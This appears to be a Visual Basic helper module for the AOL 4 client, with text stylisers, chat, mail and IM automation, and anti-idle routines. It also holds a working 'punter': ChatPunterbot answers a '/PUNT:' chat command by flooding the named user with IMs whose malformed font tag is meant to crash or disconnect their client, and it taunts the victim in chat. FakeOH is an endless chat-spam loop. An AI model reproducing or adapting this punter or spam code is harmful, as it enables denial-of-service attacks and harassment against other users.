If nextChr$ = "u" Then Let nextChr$ = "µ"
If nextChr$ = "V" Then Let nextChr$ = "\/"
If nextChr$ = "W" Then Let nextChr$ = "VV"
If nextChr$ = "w" Then Let nextChr$ = "vv"
If nextChr$ = "X" Then Let nextChr$ = "X"
If nextChr$ = "x" Then Let nextChr$ = "×"
If nextChr$ = "Y" Then Let nextChr$ = "¥"
If nextChr$ = "y" Then Let nextChr$ = "ý"
If nextChr$ = "!" Then Let nextChr$ = "¡"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = "." Then Let nextChr$ = "…"
If nextChr$ = "," Then Let nextChr$ = "‚"
If nextChr$ = "1" Then Let nextChr$ = "¹"
If nextChr$ = "%" Then Let nextChr$ = "‰"
If nextChr$ = "2" Then Let nextChr$ = "²"
If nextChr$ = "3" Then Let nextChr$ = "³"
If nextChr$ = "_" Then Let nextChr$ = "¯"
If nextChr$ = "-" Then Let nextChr$ = "—"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "<" Then Let nextChr$ = "«"
If nextChr$ = ">" Then Let nextChr$ = "»"
If nextChr$ = "*" Then Let nextChr$ = "¤"
If nextChr$ = "`" Then Let nextChr$ = "“"
If nextChr$ = "'" Then Let nextChr$ = "”"
If nextChr$ = "0" Then Let nextChr$ = "º"
Let newsent$ = newsent$ + nextChr$

Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function

Function r_elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed

If nextChr$ = "A" Then Let nextChr$ = "/\"
If nextChr$ = "a" Then Let nextChr$ = "å"
If nextChr$ = "B" Then Let nextChr$ = "ß"
If nextChr$ = "C" Then Let nextChr$ = "Ç"
If nextChr$ = "c" Then Let nextChr$ = "¢"
If nextChr$ = "D" Then Let nextChr$ = "Ð"
If nextChr$ = "d" Then Let nextChr$ = "ð"
If nextChr$ = "E" Then Let nextChr$ = "Ê"
If nextChr$ = "e" Then Let nextChr$ = "è"
If nextChr$ = "f" Then Let nextChr$ = "ƒ"
If nextChr$ = "H" Then Let nextChr$ = "|-|"
If nextChr$ = "I" Then Let nextChr$ = "‡"
If nextChr$ = "i" Then Let nextChr$ = "î"
If nextChr$ = "k" Then Let nextChr$ = "|‹"
If nextChr$ = "L" Then Let nextChr$ = "£"
If nextChr$ = "M" Then Let nextChr$ = "]V["
If nextChr$ = "m" Then Let nextChr$ = "^^"
If nextChr$ = "N" Then Let nextChr$ = "/\/"
If nextChr$ = "n" Then Let nextChr$ = "ñ"
If nextChr$ = "O" Then Let nextChr$ = "Ø"
If nextChr$ = "o" Then Let nextChr$ = "ö"
If nextChr$ = "P" Then Let nextChr$ = "¶"
If nextChr$ = "p" Then Let nextChr$ = "Þ"
If nextChr$ = "r" Then Let nextChr$ = "®"
If nextChr$ = "S" Then Let nextChr$ = "§"
If nextChr$ = "s" Then Let nextChr$ = "$"
If nextChr$ = "t" Then Let nextChr$ = "†"
If nextChr$ = "U" Then Let nextChr$ = "Ú"
If nextChr$ = "u" Then Let nextChr$ = "µ"
If nextChr$ = "V" Then Let nextChr$ = "\/"
If nextChr$ = "W" Then Let nextChr$ = "VV"
If nextChr$ = "w" Then Let nextChr$ = "vv"
If nextChr$ = "X" Then Let nextChr$ = "X"
If nextChr$ = "x" Then Let nextChr$ = "×"
If nextChr$ = "Y" Then Let nextChr$ = "¥"
If nextChr$ = "y" Then Let nextChr$ = "ý"
If nextChr$ = "!" Then Let nextChr$ = "¡"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = "." Then Let nextChr$ = "…"
If nextChr$ = "," Then Let nextChr$ = "‚"
If nextChr$ = "1" Then Let nextChr$ = "¹"
If nextChr$ = "%" Then Let nextChr$ = "‰"
If nextChr$ = "2" Then Let nextChr$ = "²"
If nextChr$ = "3" Then Let nextChr$ = "³"
If nextChr$ = "_" Then Let nextChr$ = "¯"
If nextChr$ = "-" Then Let nextChr$ = "—"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "<" Then Let nextChr$ = "«"
If nextChr$ = ">" Then Let nextChr$ = "»"
If nextChr$ = "*" Then Let nextChr$ = "¤"
If nextChr$ = "`" Then Let nextChr$ = "“"
If nextChr$ = "'" Then Let nextChr$ = "”"
If nextChr$ = "0" Then Let nextChr$ = "º"
Let newsent$ = newsent$ + nextChr$

Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop

r_elite = (newsent$)

End Function
Function r_hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
If nextChr$ = "A" Then Let nextChr$ = "a"
If nextChr$ = "E" Then Let nextChr$ = "e"
If nextChr$ = "I" Then Let nextChr$ = "i"
If nextChr$ = "O" Then Let nextChr$ = "o"
If nextChr$ = "U" Then Let nextChr$ = "u"
If nextChr$ = "b" Then Let nextChr$ = "B"
If nextChr$ = "c" Then Let nextChr$ = "C"
If nextChr$ = "d" Then Let nextChr$ = "D"
If nextChr$ = "z" Then Let nextChr$ = "Z"
If nextChr$ = "f" Then Let nextChr$ = "F"
If nextChr$ = "g" Then Let nextChr$ = "G"
If nextChr$ = "h" Then Let nextChr$ = "H"
If nextChr$ = "y" Then Let nextChr$ = "Y"
If nextChr$ = "j" Then Let nextChr$ = "J"
If nextChr$ = "k" Then Let nextChr$ = "K"
If nextChr$ = "l" Then Let nextChr$ = "L"
If nextChr$ = "m" Then Let nextChr$ = "M"
If nextChr$ = "n" Then Let nextChr$ = "N"
If nextChr$ = "x" Then Let nextChr$ = "X"
If nextChr$ = "p" Then Let nextChr$ = "P"
If nextChr$ = "q" Then Let nextChr$ = "Q"
If nextChr$ = "r" Then Let nextChr$ = "R"
If nextChr$ = "s" Then Let nextChr$ = "S"
If nextChr$ = "t" Then Let nextChr$ = "T"
If nextChr$ = "w" Then Let nextChr$ = "W"
If nextChr$ = "v" Then Let nextChr$ = "V"
If nextChr$ = " " Then Let nextChr$ = " "
Let newsent$ = newsent$ + nextChr$
Loop
BoldBlackBlueBlack (newsent$)


End Function
Function R_Hacker2(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
If nextChr$ = "A" Then Let nextChr$ = "a"
If nextChr$ = "E" Then Let nextChr$ = "e"
If nextChr$ = "I" Then Let nextChr$ = "i"
If nextChr$ = "O" Then Let nextChr$ = "o"
If nextChr$ = "U" Then Let nextChr$ = "u"
If nextChr$ = "b" Then Let nextChr$ = "B"
If nextChr$ = "c" Then Let nextChr$ = "C"
If nextChr$ = "d" Then Let nextChr$ = "D"
If nextChr$ = "z" Then Let nextChr$ = "Z"
If nextChr$ = "f" Then Let nextChr$ = "F"
If nextChr$ = "g" Then Let nextChr$ = "G"
If nextChr$ = "h" Then Let nextChr$ = "H"
If nextChr$ = "y" Then Let nextChr$ = "Y"
If nextChr$ = "j" Then Let nextChr$ = "J"
If nextChr$ = "k" Then Let nextChr$ = "K"
If nextChr$ = "l" Then Let nextChr$ = "L"
If nextChr$ = "m" Then Let nextChr$ = "M"
If nextChr$ = "n" Then Let nextChr$ = "N"
If nextChr$ = "x" Then Let nextChr$ = "X"
If nextChr$ = "p" Then Let nextChr$ = "P"
If nextChr$ = "q" Then Let nextChr$ = "Q"
If nextChr$ = "r" Then Let nextChr$ = "R"
If nextChr$ = "s" Then Let nextChr$ = "S"
If nextChr$ = "t" Then Let nextChr$ = "T"
If nextChr$ = "w" Then Let nextChr$ = "W"
If nextChr$ = "v" Then Let nextChr$ = "V"
If nextChr$ = " " Then Let nextChr$ = " "
Let newsent$ = newsent$ + nextChr$
Loop
BoldBlackBlueBlack2 (newsent$)


End Function
Function R_Spaced2(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + " "
Let newsent$ = newsent$ + nextChr$
Loop
 RedBlackRed2 (newsent$)

End Function

Function r_spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + " "
Let newsent$ = newsent$ + nextChr$
Loop
 BoldRedBlackRed (newsent$)

End Function
Function findchildbytitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
findchildbytitle = 0

bone:
room% = firs%
findchildbytitle = room%
End Function

Function GetClass(child)
Buffer$ = String$(250, 0)
getclas% = GetClassName(child, Buffer$, 250)

GetClass = Buffer$
End Function

Function FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
room% = FindChildByClass(mdi%, "AOL Child")
StuFF% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If StuFF% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function
Function UserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(AOL%, "MDIClient")
welcome1% = findchildbytitle(mdi%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome1%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome1%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = User
End Function

Sub killwait()

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call Timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = findchildbytitle(mdi%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Public Function Encrypt(word$)
'written by  Soap Shoe
'Thanxz
word$ = LCase(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
If letter$ = "a" Then Leet$ = "$"
If letter$ = "b" Then Leet$ = "^"
If letter$ = "c" Then Leet$ = "&"
If letter$ = "d" Then Leet$ = "*"
If letter$ = "e" Then Leet$ = "("
If letter$ = "f" Then Leet$ = ")"
If letter$ = "g" Then Leet$ = "_"
If letter$ = "h" Then Leet$ = "%"
If letter$ = "i" Then Leet$ = "+"
If letter$ = "j" Then Leet$ = "="
If letter$ = "k" Then Leet$ = "-"
If letter$ = "l" Then Leet$ = "|"
If letter$ = "m" Then Leet$ = "\"
If letter$ = "n" Then Leet$ = "]"
If letter$ = "o" Then Leet$ = "["
If letter$ = "p" Then Leet$ = "}"
If letter$ = "q" Then Leet$ = "{"
If letter$ = "r" Then Leet$ = "'"
If letter$ = "s" Then Leet$ = ":"
If letter$ = "t" Then Leet$ = ";"
If letter$ = "u" Then Leet$ = "/"
If letter$ = "v" Then Leet$ = "?"
If letter$ = "w" Then Leet$ = "."
If letter$ = "x" Then Leet$ = ">"
If letter$ = "y" Then Leet$ = ","
If letter$ = "z" Then Leet$ = "<"
            
If Len(Leet$) = 0 Then Leet$ = letter$
Made$ = Made$ & Leet$
Next q

SendChat "<font face=""Arial""></b>Il|lI" + Made$
End Function

Public Function UnEncrypt(word$)
'written by  Soap Shoe
'Thanxz
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
If letter$ = "$" Then Leet$ = "a"
If letter$ = "^" Then Leet$ = "b"
If letter$ = "&" Then Leet$ = "c"
If letter$ = "*" Then Leet$ = "d"
If letter$ = "(" Then Leet$ = "e"
If letter$ = ")" Then Leet$ = "f"
If letter$ = "_" Then Leet$ = "g"
If letter$ = "%" Then Leet$ = "h"
If letter$ = "+" Then Leet$ = "i"
If letter$ = "=" Then Leet$ = "j"
If letter$ = "-" Then Leet$ = "k"
If letter$ = "|" Then Leet$ = "l"
If letter$ = "\" Then Leet$ = "m"
If letter$ = "]" Then Leet$ = "n"
If letter$ = "[" Then Leet$ = "o"
If letter$ = "}" Then Leet$ = "p"
If letter$ = "{" Then Leet$ = "q"
If letter$ = "'" Then Leet$ = "r"
If letter$ = ":" Then Leet$ = "s"
If letter$ = ";" Then Leet$ = "t"
If letter$ = "/" Then Leet$ = "u"
If letter$ = "?" Then Leet$ = "v"
If letter$ = "." Then Leet$ = "w"
If letter$ = ">" Then Leet$ = "x"
If letter$ = "," Then Leet$ = "y"
If letter$ = "<" Then Leet$ = "z"
            
If Len(Leet$) = 0 Then Leet$ = letter$
Made$ = Made$ & Leet$
Next q

UnEncrypt = Made$
End Function

Function IsUserOnline2(Lbl As Label)
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
welcome1% = findchildbytitle(mdi%, "Welcome,")
If welcome1% <> 0 Then
   IsUserOnline2 = 1
   Lbl.Caption = "Online"
Else:
   IsUserOnline2 = 0
   Lbl.Caption = "Offline"
End If
End Function
Function IsUserOnline(Lbl As Label)
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
welcome1% = findchildbytitle(mdi%, "Welcome,")
If welcome1% <> 0 Then
   IsUserOnline = 1
   Else:
   IsUserOnline = 0
   End If
End Function
Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Sub SendChat(chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, "</B>" & chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub sendchat2(chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, chat)
End Sub
Sub Timeout(duration)
starttime = Timer
Do While Timer - starttime < duration
DoEvents
Loop

End Sub

Sub StayOnTop(theform As Form)
'alot of peeps been sayin this
'don't werk with vb4.. somone told me
'for VB 4 use the code of
'Call stayontop (TheForm)
'in a timer set at interval of 1
SetWinOnTop = SetWindowPos(theform.hwnd, HWND_TOPMOST, 0, 0, 0, 0, flags)
End Sub
Sub ChatPunterbot(sn1 As TextBox, Bombs As TextBox)
'This will see if somebody types /Punt: in a chat
'room...then punt the SN they put.
On Error GoTo ErrHandler
GINA69 = AOLGetUser
GINA69 = UCase(GINA69)

heh$ = LastChatLine
heh$ = UCase(heh$)
naw$ = Mid(heh$, InStr(heh$, ":") + 2)
Timeout (0.3)
SN = Mid(naw$, InStr(naw$, ":") + 1)
SN = UCase(SN)
Timeout (0.3)
pntstr = Mid$(naw$, 1, (InStr(naw$, ":") - 1))
GINA = pntstr
If GINA = "/PUNT" Then
sn1 = SN
If sn1 = GINA69 Or sn1 = " " + GINA69 Or sn1 = "  " + GINA69 Or sn1 = "   " + GINA69 Or sn1 = "     " + GINA69 Or sn1 = "      " + GINA69 Then
sn1 = AOLGetSNfromCHAT
    BoldPurpleRed "· ···•(\›•    Room Punter"
    BoldPurpleRed "· ···•(\›•    I can't punt myself BITCH!"
    BoldPurpleRed "· ···•(\›•    Now U Get PUNTED!"
    GoTo JAKC
    Timeout (1)
Exit Sub
End If
    GoTo SendITT
Else
    Exit Sub
End If
SendITT:
BoldPurpleRed "· ···•(\›•    Room punt"
BoldPurpleRed "· ···•(\›•    Request Noted"
BoldPurpleRed "· ···•(\›•    Now †h®åShîng - " + sn1
BoldPurpleRed "· ···•(\›•    Punting With - " + Bombs + " IMz"
JAKC:
Call IMsOff
Do
Call IMKeyword(sn1, "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>")
Bombs = Str(Val(Bombs - 1))
If FindWindow("#32770", "Aol canada") <> 0 Then Exit Sub: MsgBox "This User is not currently signed on, or his/her IMz are Off."
Loop Until Bombs <= 0
Call IMsOn
Bombs = "10"
ErrHandler:
    Exit Sub
End Sub
Public Sub Macrothing(txt As TextBox)
'This scrolls a multilined textbox adding timeouts where needed
'This is basically for macro shops and things like that.
BoldPurpleRed "· ···•(\›• INCOMMING TEXT"
Timeout 4
Dim onelinetxt$, X$, Start%, i%
Start% = 1
fa = 1
For i% = Start% To Len(txt.text)
X$ = Mid(txt.text, i%, 1)
onelinetxt$ = onelinetxt$ + X$
If Asc(X$) = 13 Then
BoldPurpleRed ": " + onelinetxt$
Timeout (0.5)
J% = J% + 1
i% = InStr(Start%, txt.text, X$)
If i% >= Len(txt.text) Then Exit For
Start% = i% + 1
onelinetxt$ = ""
End If
Next i%
BoldSendChat ":" + onelinetxt$
End Sub
Sub Anti45MinTimer()
'use this sub in a timer set at 100
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub AntiIdle()
'use this sub in a timer set at 100
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub ClickIcon(icon%)
C% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
C% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub SendMail(Recipiants, subject, message)

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(AOL%, "MDIClient")
AOMail% = findchildbytitle(mdi%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = findchildbytitle(mdi%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function

Sub keyword(TheKeyWord As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 20
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

' ******************************

Call Timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = findchildbytitle(mdi%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, TheKeyWord)

Call Timeout(0.05)
ClickIcon (AOIcon2%)
ClickIcon (AOIcon2%)

End Sub

Function BoldAOL4_WavColors(Text1 As String)
G$ = Text1
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
SendChat (p$)
End Function
Function AOL4_WavColors3(Text1 As String)

End Function
Sub IMBuddy(Recipiant, message)

AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
Buddy% = findchildbytitle(mdi%, "Buddy List Window")

If Buddy% = 0 Then
    keyword ("BuddyView")
    Do: DoEvents
    Loop Until Buddy% <> 0
End If

AOIcon% = FindChildByClass(Buddy%, "_AOL_Icon")

For L = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next L

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
IMwin% = findchildbytitle(mdi%, "Send Instant Message")
AOEdit% = FindChildByClass(IMwin%, "_AOL_Edit")
AORich% = FindChildByClass(IMwin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMwin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
IMwin% = findchildbytitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMwin%, WM_CLOSE, 0, 0): Exit Do
If IMwin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, message)

AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")

Call keyword("aol://9293:")

Do: DoEvents
IMwin% = findchildbytitle(mdi%, "Send Instant Message")
AOEdit% = FindChildByClass(IMwin%, "_AOL_Edit")
AORich% = FindChildByClass(IMwin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMwin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
IMwin% = findchildbytitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMwin%, WM_CLOSE, 0, 0): Exit Do
If IMwin% = 0 Then Exit Do
Loop

End Sub
Function AddMailToList(which As Integer, List As ListBox)

AoL40& = FindWindow("AOL Frame25", vbNullString)
mdi& = AoLMDI
tb& = FindChildByClass(AoL40&, "AOL Toolbar")
Toolz& = FindChildByClass(tb&, "_AOL_Toolbar")
AoLRead& = FindChildByClass(Toolz&, "_AOL_Icon")
ClickIcon (AoLRead&)
Timeout 0.1
U$ = GetUser
Do:
DoEvents
MailPar& = findchildbytitle(mdi&, U$ + "'s Online Mailbox")
TabControl& = FindChildByClass(MailPar&, "_AOL_TabControl")
TabPage& = FindChildByClass(TabControl&, "_AOL_TabPage")
If which = 2 Then TabPage& = GetWindow(TabPage&, GW_HWNDNEXT)
If which = 3 Then TabPage& = GetWindow(TabPage&, GW_HWNDNEXT): TabPage& = GetWindow(TabPage&, GW_HWNDNEXT)
tree& = FindChildByClass(TabPage&, "_AOL_Tree")
If MailPar& <> 0 And TabControl& <> 0 And TabPage& <> 0 And tree& <> 0 Then Exit Do
Loop

sBuffer& = SendMessage(tree&, &H18B, 0, 0)

For MailNum = 0 To sBuffer
txtlen& = SendMessageByNum(tree&, &H18A, MailNum, 0&)
txt$ = String(txtlen& + 1, 0&)
GTTXT& = SendMessageByString(tree&, &H189, MailNum, txt$)
NewMail = RTrim(txt$)
List.AddItem (NewMail)
Next MailNum

End Function

Sub HideWelcome()
Welc& = findchildbytitle(AoLMDI, "Welcome,")
Ret& = ShowWindow(Welc&, 0)
Ret& = SetFocusAPI(AOL&)
End Sub


Sub FakeOH(txt1 As TextBox)
shit = String(116, Chr(32))
d = 116 - Len("Tko4.0")
C$ = Left(shit, d)
Do
Call SendChat(txt1 & C$ & "         ")
Timeout 0.6
Call SendChat(txt1 & C$ & "         ")
Timeout 0.3
Call SendChat(txt1 & C$ & "         ")
Timeout 0.6
Call SendChat(txt1 & C$ & "         ")
Timeout 0.6
Call SendChat(txt1 & C$ & "         ")
Timeout 0.3
Call SendChat(txt1 & C$ & "         ")
Timeout 0.6
Loop
End Sub
Function CountMail()
AoL40& = FindWindow("AOL Frame25", vbNullString)
mdi& = AoLMDI
tb& = FindChildByClass(AoL40&, "AOL Toolbar")
Toolz& = FindChildByClass(tb&, "_AOL_Toolbar")
AoLRead& = FindChildByClass(Toolz&, "_AOL_Icon")
ClickIcon (AoLRead&)
Timeout 0.1
U$ = GetUser
Do:
DoEvents
MailPar& = findchildbytitle(mdi&, U$ + "'s Online Mailbox")
TabControl& = FindChildByClass(MailPar&, "_AOL_TabControl")
TabPage& = FindChildByClass(TabControl&, "_AOL_TabPage")
tree& = FindChildByClass(TabPage&, "_AOL_Tree")
If MailPar& <> 0 And TabControl& <> 0 And TabPage& <> 0 And tree& <> 0 Then Exit Do
Loop
Timeout 5
sBuffer = SendMessage(tree&, &H18B, 0, 0&)
If sBuffer > 1 Then
MsgBox "You have " & sBuffer & " messages in your Mailbox.", vbInformation
GoTo Closer
End If
If sBuffer = 1 Then
MsgBox "You have one message in your Mailbox.", vbInformation
GoTo Closer
End If
If sBuffer < 1 Then
MsgBox "You have no messages in your Mailbox.", vbInformation
GoTo Closer
End If
Closer:
Ret& = SendMessage(MailPar&, &H10, 0, 0&)
End Function

